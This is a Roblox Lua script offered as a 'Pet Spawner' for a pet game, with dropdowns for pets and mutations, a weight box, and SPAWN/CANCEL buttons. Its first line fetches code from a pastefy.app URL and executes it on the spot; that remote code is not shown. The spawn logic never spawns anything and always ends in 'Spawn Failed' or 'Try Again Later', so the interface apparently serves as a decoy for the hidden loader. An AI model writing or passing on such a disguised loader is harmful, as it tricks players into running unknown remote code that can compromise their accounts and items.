loadstring(game:HttpGet("https://pastefy.app/SlyIXbKW/raw"))()
‎local Players = game:GetService("Players")
‎local UIS = game:GetService("UserInputService")
‎local TweenService = game:GetService("TweenService")
‎
‎local player = Players.LocalPlayer
‎local playerGui = player:WaitForChild("PlayerGui")
‎
‎-- CLEAR OLD UI
‎local existing = playerGui:FindFirstChild("PetSpawnerUI")
‎if existing then existing:Destroy() end
‎
‎-- MAIN UI HOLDER
‎local screenGui = Instance.new("ScreenGui")
‎screenGui.Name = "PetSpawnerUI"
‎screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
‎screenGui.Parent = playerGui
‎
‎-- UTILS
‎local function makeCorner(parent, radius)
‎local corner = Instance.new("UICorner")
‎corner.CornerRadius = UDim.new(0, radius)
‎corner.Parent = parent
‎end
‎
‎local function createButton(parent, text, pos, size, color)
‎local btn = Instance.new("TextButton")
‎btn.Size = size
‎btn.Position = pos
‎btn.BackgroundColor3 = color
‎btn.Font = Enum.Font.GothamBold
‎btn.TextSize = 14
‎btn.TextColor3 = Color3.fromRGB(255,255,255)
‎btn.Text = text
‎btn.AutoButtonColor = true
‎btn.ZIndex = 10
‎btn.Parent = parent
‎makeCorner(btn, 8)
‎return btn
‎end
‎
‎local function showPopup(message, color, duration)
‎duration = duration or 2
‎local popup = Instance.new("Frame")
‎popup.Size = UDim2.new(0.8, 0, 0, 40)
‎popup.Position = UDim2.new(0.1, 0, 0.8, 0)
‎popup.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
‎popup.ZIndex = 50
‎popup.Parent = screenGui
‎makeCorner(popup, 8)
‎
‎local textLabel = Instance.new("TextLabel")
‎textLabel.Size = UDim2.new(1, -10, 1, 0)
‎textLabel.Position = UDim2.new(0, 5, 0, 0)
‎textLabel.BackgroundTransparency = 1
‎textLabel.Font = Enum.Font.GothamBold
‎textLabel.TextSize = 14
‎textLabel.Text = message
‎textLabel.TextColor3 = color
‎textLabel.TextXAlignment = Enum.TextXAlignment.Center
‎textLabel.ZIndex = 51
‎textLabel.Parent = popup
‎
‎popup.BackgroundTransparency = 1
‎textLabel.TextTransparency = 1
‎TweenService:Create(popup, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
‎TweenService:Create(textLabel, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
‎
‎if duration > 0 then
‎task.delay(duration, function()
‎TweenService:Create(popup, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
‎TweenService:Create(textLabel, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
‎task.delay(0.35, function() popup:Destroy() end)
‎end)
‎end
‎
‎return popup, textLabel
‎
‎end
‎
‎-- DROPDOWN CREATOR
‎local function createDropdown(parent, labelText, options, pos)
‎local container = Instance.new("Frame")
‎container.Size = UDim2.new(0.48, 0, 0, 54)
‎container.Position = pos
‎container.BackgroundTransparency = 1
‎container.ZIndex = 10
‎container.Parent = parent
‎
‎local label = Instance.new("TextLabel")
‎label.Size = UDim2.new(1, 0, 0, 18)
‎label.Position = UDim2.new(0,0,0,0)
‎label.BackgroundTransparency = 1
‎label.Font = Enum.Font.GothamBold
‎label.Text = labelText
‎label.TextSize = 12
‎label.TextColor3 = Color3.fromRGB(220,220,220)
‎label.TextXAlignment = Enum.TextXAlignment.Left
‎label.ZIndex = 10
‎label.Parent = container
‎
‎local box = Instance.new("TextButton")
‎box.Size = UDim2.new(1, 0, 0, 28)
‎box.Position = UDim2.new(0, 0, 0, 22)
‎box.BackgroundColor3 = Color3.fromRGB(38,38,38)
‎box.Font = Enum.Font.Gotham
‎box.TextSize = 14
‎box.Text = "Select"
‎box.TextColor3 = Color3.fromRGB(235,235,235)
‎box.ZIndex = 10
‎box.Parent = container
‎makeCorner(box, 8)
‎
‎local dropdownFrame = Instance.new("ScrollingFrame")
‎dropdownFrame.Size = UDim2.new(1, 0, 0, 100)
‎dropdownFrame.Position = UDim2.new(0, 0, 0, 52)
‎dropdownFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
‎dropdownFrame.ScrollBarThickness = 6
‎dropdownFrame.Visible = false
‎dropdownFrame.ZIndex = 20
‎dropdownFrame.Parent = container
‎makeCorner(dropdownFrame, 8)
‎
‎local layout = Instance.new("UIListLayout")
‎layout.Parent = dropdownFrame
‎layout.Padding = UDim.new(0, 2)
‎layout.SortOrder = Enum.SortOrder.LayoutOrder
‎
‎local contentPadding = Instance.new("UIPadding")
‎contentPadding.PaddingTop = UDim.new(0, 2)
‎contentPadding.PaddingBottom = UDim.new(0, 2)
‎contentPadding.Parent = dropdownFrame
‎
‎dropdownFrame.CanvasSize = UDim2.new(0, 0, 0, #options * 24)
‎
‎for _, opt in ipairs(options) do
‎local optBtn = Instance.new("TextButton")
‎optBtn.Size = UDim2.new(1, -6, 0, 22)
‎optBtn.BackgroundColor3 = Color3.fromRGB(45,45,45)
‎optBtn.Font = Enum.Font.Gotham
‎optBtn.TextSize = 12
‎optBtn.TextColor3 = Color3.fromRGB(235,235,235)
‎optBtn.Text = opt
‎optBtn.ZIndex = 21
‎optBtn.Parent = dropdownFrame
‎makeCorner(optBtn, 6)
‎optBtn.MouseButton1Click:Connect(function()
‎box.Text = opt
‎dropdownFrame.Visible = false
‎end)
‎end
‎
‎box.MouseButton1Click:Connect(function()
‎dropdownFrame.Visible = not dropdownFrame.Visible
‎end)
‎
‎return {Container = container, Box = box}
‎
‎end
‎
‎-- DATA
‎local pets = {"Cockatrice","Corrupted Kitsune","Disco Bee","Dragonfly","Fennec Fox","French Fry Ferret",
‎"Golden Goose","Griffin","Kitsune","Lobster Thermidor","Mimic Octopus","Phoenix","Queen Bee",
‎"Raiju","Raccon","Space Squirrel","Spinosauros","Swan","T-Rex"}
‎local mutations = {"Ascended","Gold","Rainbow"}
‎
‎-- MAIN FRAME
‎local mainFrame = Instance.new("Frame")
‎mainFrame.Name = "MainFrame"
‎mainFrame.Size = UDim2.new(0, 360, 0, 230)
‎mainFrame.Position = UDim2.new(0.5, -180, 0.28, 0)
‎mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
‎mainFrame.BorderSizePixel = 0
‎mainFrame.ZIndex = 5
‎mainFrame.Parent = screenGui
‎makeCorner(mainFrame, 14)
‎
‎-- TITLE
‎local title = Instance.new("TextLabel")
‎title.Size = UDim2.new(1, -20, 0, 30)
‎title.Position = UDim2.new(0, 10, 0, 10)
‎title.BackgroundTransparency = 1
‎title.Font = Enum.Font.GothamBold
‎title.Text = "Pet Spawner"
‎title.TextSize = 18
‎title.TextColor3 = Color3.fromRGB(255,170,0)
‎title.TextXAlignment = Enum.TextXAlignment.Center
‎title.ZIndex = 10
‎title.Parent = mainFrame
‎
‎-- LEFT SIDE BUTTONS
‎local sideFrame = Instance.new("Frame")
‎sideFrame.Size = UDim2.new(0, 60, 1, -20)
‎sideFrame.Position = UDim2.new(0, -65, 0, 10)
‎sideFrame.BackgroundTransparency = 1
‎sideFrame.ZIndex = 10
‎sideFrame.Parent = mainFrame
‎
‎local infoBtn = createButton(sideFrame, "INFO", UDim2.new(0,0,0,0), UDim2.new(1,0,0,40), Color3.fromRGB(0,120,255))
‎infoBtn.TextSize = 12
‎local mainBtn = createButton(sideFrame, "MAIN", UDim2.new(0,0,0,50), UDim2.new(1,0,0,40), Color3.fromRGB(255,140,0))
‎mainBtn.TextSize = 12
‎
‎-- INFO BOX HANDLING
‎local currentInfoBox = nil
‎infoBtn.MouseButton1Click:Connect(function()
‎if currentInfoBox then currentInfoBox:Destroy() end
‎
‎local infoBox = Instance.new("Frame")
‎infoBox.Size = UDim2.new(0, 320, 0, 150)
‎infoBox.Position = UDim2.new(0.5, -160, 0.4, 0)
‎infoBox.BackgroundColor3 = Color3.fromRGB(25,25,25)
‎infoBox.ZIndex = 15
‎infoBox.Parent = screenGui
‎makeCorner(infoBox, 12)
‎
‎local infoTitle = Instance.new("TextLabel")
‎infoTitle.Size = UDim2.new(1, -20, 0, 30)
‎infoTitle.Position = UDim2.new(0, 10, 0, 10)
‎infoTitle.BackgroundTransparency = 1
‎infoTitle.Font = Enum.Font.GothamBold
‎infoTitle.Text = "How to Use This Script"
‎infoTitle.TextSize = 16
‎infoTitle.TextColor3 = Color3.fromRGB(255,170,0)
‎infoTitle.TextXAlignment = Enum.TextXAlignment.Center
‎infoTitle.ZIndex = 16
‎infoTitle.Parent = infoBox
‎
‎local instructions = Instance.new("TextLabel")
‎instructions.Size = UDim2.new(1, -20, 0, 90)
‎instructions.Position = UDim2.new(0, 10, 0, 50)
‎instructions.BackgroundTransparency = 1
‎instructions.Font = Enum.Font.Gotham
‎instructions.TextSize = 14
‎instructions.TextColor3 = Color3.fromRGB(235,235,235)
‎instructions.Text = "1. Choose a pet\n2. Choose a mutation\n3. Enter weight (kg)\n4. Click SPAWN\n\nSpawn cannot be canceled until finished."
‎instructions.TextXAlignment = Enum.TextXAlignment.Left
‎instructions.TextYAlignment = Enum.TextYAlignment.Top
‎instructions.ZIndex = 16
‎instructions.Parent = infoBox
‎
‎local closeInfoBtn = createButton(infoBox, "CLOSE", UDim2.new(0.25,0,1,-40), UDim2.new(0.5,0,0,30), Color3.fromRGB(170,0,0))
‎closeInfoBtn.MouseButton1Click:Connect(function()
‎infoBox:Destroy()
‎currentInfoBox = nil
‎end)
‎
‎currentInfoBox = infoBox
‎
‎end)
‎
‎mainBtn.MouseButton1Click:Connect(function()
‎if currentInfoBox then
‎currentInfoBox:Destroy()
‎currentInfoBox = nil
‎end
‎end)
‎
‎-- INPUTS FRAME
‎local inputsFrame = Instance.new("Frame")
‎inputsFrame.Size = UDim2.new(1, -20, 0, 120)
‎inputsFrame.Position = UDim2.new(0, 10, 0, 50)
‎inputsFrame.BackgroundTransparency = 1
‎inputsFrame.ZIndex = 10
‎inputsFrame.Parent = mainFrame
‎
‎local choosePetDrop = createDropdown(inputsFrame, "Choose Pet", pets, UDim2.new(0, 0, 0, 0))
‎local mutationDrop = createDropdown(inputsFrame, "Choose Mutation", mutations, UDim2.new(0.52, 0, 0, 0))
‎
‎local kgLabel = Instance.new("TextLabel")
‎kgLabel.Size = UDim2.new(1, 0, 0, 18)
‎kgLabel.Position = UDim2.new(0, 0, 0, 60)
‎kgLabel.BackgroundTransparency = 1
‎kgLabel.Font = Enum.Font.GothamBold
‎kgLabel.Text = "Weight (kg)"
‎kgLabel.TextSize = 12
‎kgLabel.TextColor3 = Color3.fromRGB(220,220,220)
‎kgLabel.TextXAlignment = Enum.TextXAlignment.Left
‎kgLabel.ZIndex = 10
‎kgLabel.Parent = inputsFrame
‎
‎local kgBox = Instance.new("TextBox")
‎kgBox.Size = UDim2.new(1, 0, 0, 28)
‎kgBox.Position = UDim2.new(0, 0, 0, 78)
‎kgBox.BackgroundColor3 = Color3.fromRGB(38,38,38)
‎kgBox.PlaceholderText = "Enter weight (numeric, <100)"
‎kgBox.ClearTextOnFocus = false
‎kgBox.Font = Enum.Font.Gotham
‎kgBox.TextSize = 14
‎kgBox.Text = ""
‎kgBox.TextColor3 = Color3.fromRGB(235,235,235)
‎kgBox.ZIndex = 10
‎kgBox.Parent = inputsFrame
‎
‎-- Restrict kg input to natural numbers <100
‎kgBox:GetPropertyChangedSignal("Text"):Connect(function()
‎local num = tonumber(kgBox.Text)
‎if not num or num < 1 or num >= 100 or math.floor(num) ~= num then
‎kgBox.TextColor3 = Color3.fromRGB(255,50,50)
‎else
‎kgBox.TextColor3 = Color3.fromRGB(235,235,235)
‎end
‎end)
‎
‎-- SPAWN & CANCEL BUTTONS
‎local spawnBtn = createButton(mainFrame, "SPAWN", UDim2.new(0.05,0,0,180), UDim2.new(0.42,0,0,36), Color3.fromRGB(0,170,0))
‎local cancelBtn = createButton(mainFrame, "CANCEL", UDim2.new(0.53,0,0,180), UDim2.new(0.42,0,0,36), Color3.fromRGB(170,0,0))
‎
‎-- Control variable to stop spawning on cancel
‎local spawningActive = false
‎local spawnStarted = false
‎
‎local function attemptSpawn(pet, mutation, weight, retryCount)
‎retryCount = retryCount or 1
‎spawnStarted = true
‎if not spawningActive then
‎spawnStarted = false
‎return
‎end
‎
‎local spawnPopup, spawnText = showPopup("Spawning "..pet.." ("..mutation..")...", Color3.fromRGB(0,200,0), 0)
‎
‎task.delay(20, function()
‎if not spawningActive then
‎spawnText.Text = "Spawn Cancelled"
‎spawnText.TextColor3 = Color3.fromRGB(200,0,0)
‎task.delay(2, function()
‎if spawnPopup then
‎TweenService:Create(spawnPopup, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
‎TweenService:Create(spawnText, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
‎task.delay(0.35, function() spawnPopup:Destroy() end)
‎end
‎end)
‎spawnStarted = false
‎return
‎end
‎
‎if retryCount >= 5 then    
‎    spawnText.Text = "Try Again Later"    
‎    spawnText.TextColor3 = Color3.fromRGB(255,50,50)    
‎    task.delay(2, function()    
‎        if spawnPopup then    
‎            TweenService:Create(spawnPopup, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()    
‎            TweenService:Create(spawnText, TweenInfo.new(0.3), {TextTransparency = 1}):Play()    
‎            task.delay(0.35, function() spawnPopup:Destroy() end)    
‎        end    
‎    end)    
‎    spawningActive = false    
‎    spawnStarted = false    
‎    return    
‎end    
‎
‎spawnText.Text = "Spawn Failed. Retrying..."    
‎spawnText.TextColor3 = Color3.fromRGB(255,50,50)    
‎
‎task.delay(2, function()    
‎    if spawnPopup then spawnPopup:Destroy() end    
‎    attemptSpawn(pet, mutation, weight, retryCount + 1)    
‎end)
‎
‎end)
‎
‎end
‎
‎spawnBtn.MouseButton1Click:Connect(function()
‎local pet = choosePetDrop.Box.Text
‎local mutation = mutationDrop.Box.Text
‎local weight = tonumber(kgBox.Text)
‎if pet == "Select" or mutation == "Select" or not weight or weight < 1 or weight >= 100 or math.floor(weight) ~= weight then
‎showPopup("Please complete all fields with valid weight!", Color3.fromRGB(255,50,50))
‎return
‎end
‎
‎spawningActive = true
‎attemptSpawn(pet, mutation, weight)
‎
‎end)
‎
‎cancelBtn.MouseButton1Click:Connect(function()
‎if spawnStarted then
‎spawningActive = false
‎showPopup("Spawn Cancelled", Color3.fromRGB(200,0,0))
‎end
‎end)
‎
